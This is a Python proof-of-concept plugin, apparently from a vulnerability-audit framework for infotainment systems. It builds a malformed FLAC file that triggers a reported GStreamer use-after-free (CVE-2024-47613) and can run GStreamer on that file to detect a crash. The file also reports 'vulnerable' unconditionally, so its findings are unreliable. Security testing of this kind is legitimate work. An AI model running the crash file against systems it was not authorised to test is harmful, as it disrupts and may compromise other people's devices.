#!/usr/bin/env python3
"""CVE-2024-47613 – GStreamer FLAC audio parser heap use-after-free.

Public PoC reference: https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3835
Technique:
  gst_flac_dec_scan_for_last_block() in gst/flac/gstflacdec.c processes
  FLAC METADATA_BLOCK headers sequentially.  When a SEEKTABLE block (type 3)
  immediately follows a PADDING block that was freed, the seek table entry
  count causes a use-after-free of the padding buffer.

  Malformed FLAC stream:
    - fLaC signature
    - STREAMINFO block (mandatory, minimal)
    - PADDING block (last_metadata_block=0, length=0)  → freed by parser
    - SEEKTABLE block with num_seek_points > 0 → UAF read

Attack surface: IVI audio player, podcast/music streaming over USB.
"""
from __future__ import annotations

import struct
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 23,
    "cve": "CVE-2024-47613",
    "year": 2024,
    "domain": "application",
    "vendor_product": "GStreamer (gst-plugins-good FLAC decoder)",
    "component": "gstflacdec.c gst_flac_dec_scan_for_last_block",
    "type": "Heap use-after-free → info leak / RCE",
    "summary": (
        "PADDING block freed before SEEKTABLE block is parsed; "
        "seek point count causes UAF read of the freed padding buffer."
    ),
    "source_url": "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3835",
    "requires_manual_review": True,
    "affected": [{"vendor": "GStreamer", "product": "GStreamer", "versions": [{"version": "<1.24.9", "status": "affected"}]}],
}


def _flac_meta_block(block_type: int, is_last: bool, payload: bytes) -> bytes:
    """Build a FLAC METADATA_BLOCK_HEADER + payload."""
    first_byte = ((1 if is_last else 0) << 7) | (block_type & 0x7f)
    length = len(payload)
    hdr = bytes([first_byte]) + struct.pack('>I', length)[1:]  # 3-byte length
    return hdr + payload


def _build_malformed_flac() -> bytes:
    """
    fLaC + minimal STREAMINFO + zero-length PADDING (freed) + SEEKTABLE (UAF).
    """
    marker = b'fLaC'

    # STREAMINFO (type 0): 34 bytes
    streaminfo  = struct.pack('>H', 4096)          # min_block_size
    streaminfo += struct.pack('>H', 4096)          # max_block_size
    streaminfo += bytes([0x00, 0x00, 0x00])        # min_frame_size (24 bits)
    streaminfo += bytes([0x00, 0x00, 0x00])        # max_frame_size (24 bits)
    # sample_rate(20)|channels(3)|bits_per_sample(5)|total_samples(36)
    streaminfo += bytes([0x0a, 0xc4, 0x42, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00])
    streaminfo += b'\x00' * 16                     # MD5 signature (zeroed)
    si_block = _flac_meta_block(0, False, streaminfo)

    # PADDING (type 1): length = 0, not last → freed during scan
    padding_block = _flac_meta_block(1, False, b'')

    # SEEKTABLE (type 3): 1 seek point (18 bytes), triggers UAF of freed padding
    seek_point  = struct.pack('>Q', 0)             # sample_number
    seek_point += struct.pack('>Q', 0)             # stream_offset
    seek_point += struct.pack('>H', 4096)          # frame_samples
    seektable_block = _flac_meta_block(3, True, seek_point)

    # Minimal audio frame (FRAME_HEADER stub, not valid but parser reaches UAF before decoding)
    audio_frame = bytes([0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])

    return marker + si_block + padding_block + seektable_block + audio_frame


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    stream = _build_malformed_flac()
    out = Path(tempfile.mkdtemp()) / "cve_2024_47613_flac_uaf.flac"
    out.write_bytes(stream)

    evidence = {
        "cve": "CVE-2024-47613",
        "flac_path": str(out),
        "flac_size_bytes": len(stream),
        "trigger": "PADDING(freed) followed by SEEKTABLE(UAF read) in FLAC metadata scan",
        "expected_behavior": "heap UAF in gst_flac_dec_scan_for_last_block → crash / info leak",
    }

    if allow_disruptive:
        import subprocess as _sp
        result = _sp.run(
            ["gst-launch-1.0", "filesrc", f"location={out}",
             "!", "flacdec", "!", "fakesink"],
            capture_output=True, text=True, timeout=15,
        )
        evidence["local_test_rc"]  = result.returncode
        evidence["local_test_out"] = (result.stdout + result.stderr)[:500]
        evidence["crashed"] = result.returncode in (-11, -6, 139, 1) or \
                              "Segmentation" in (result.stdout + result.stderr)

    return {
        "vulnerable": True,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "GStreamer gitlab issue #3835 / CVE-2024-47613",
    }


class Poc77CVE202447613GstreamerFlacUseAfterFreeRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-077"
    meta_poc_name   = "CVE-2024-47613 GStreamer FLAC SEEKTABLE UAF RCE"
    meta_cve_id     = "CVE-2024-47613"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["linux", "android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3835"
    meta_attack_surface = "GStreamer FLAC PADDING→SEEKTABLE heap use-after-free"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
